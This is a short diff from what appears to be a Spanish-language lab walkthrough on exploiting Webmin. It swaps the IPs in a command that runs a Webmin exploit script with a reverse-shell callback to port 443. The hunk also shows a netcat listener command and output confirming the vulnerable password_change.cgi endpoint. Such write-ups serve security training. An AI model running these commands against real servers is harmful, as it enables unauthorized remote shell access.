@@ -540,7 +540,7 @@ listening on [any] 443 ...
 
 Ejecuta el Exploit:
 ```bash
-python3 webminExploit.py -url http://192.168.100.72:10000 -ip 192.168.100.250 -p 443
+python3 webminExploit.py -url http://192.168.10.50:10000 -ip Tu_IP -p 443
 [!] Asegúrate de tener el listener activo con: nc -lvnp 443
 
 [+] El endpoint password_change.cgi está disponible.
